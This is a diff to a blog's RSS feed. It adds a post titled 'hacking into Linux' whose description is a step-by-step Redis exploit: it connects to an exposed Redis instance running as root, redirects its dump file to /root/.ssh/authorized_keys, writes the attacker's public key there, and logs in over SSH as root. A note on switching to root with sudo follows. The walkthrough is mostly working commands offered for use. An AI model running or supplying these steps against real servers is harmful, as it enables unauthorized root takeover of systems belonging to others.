@@ -29,6 +29,29 @@ pip install package -i  &lt;a href=&#34;https://pypi.douban.com/simple/&#34;&gt;
         </item>
         
         <item>
+            <title> 入侵linux</title>
+            <link>https://fiser321.github.io/2017/10/17/bug-linux/</link>
+            <pubDate>Fri, 13 Oct 2017 00:00:00 UTC</pubDate>
+            <author>CoderZh</author>
+            <guid>https://fiser321.github.io/2017/10/17/bug-linux/</guid>
+            <description>
+
+&lt;h3 id=&#34;利用暴露在公网redis端口&#34;&gt;利用暴露在公网redis端口&lt;/h3&gt;
+
+&lt;p&gt;例如 redis在公网以root用户运行，ip为: 123.123.123.123,端口为 6379&lt;br /&gt;
+1. redis-cli -h 123.123.123.123 -p 6379&lt;br /&gt;
+2. config set dbfilename authorized_keys&lt;br /&gt;
+3. config set dir &amp;ldquo;/root/.ssh&amp;rdquo;&lt;br /&gt;
+4. set aa &amp;ldquo;\n\n\$content\n\n\n&amp;rdquo; 其中content 为~/.ssh/id_rsa.pub的字符串&lt;br /&gt;
+5. save&lt;br /&gt;
+6. ssh root@123.123.123.123&lt;/p&gt;
+
+&lt;p&gt;###普通用户切换root用户&lt;br /&gt;
+sudo sudo -i&lt;/p&gt;
+</description>
+        </item>
+        
+        <item>
             <title>Linux 常见命令总结</title>
             <link>https://fiser321.github.io/2017/10/17/base-linux/</link>
             <pubDate>Fri, 13 Oct 2017 00:00:00 UTC</pubDate>
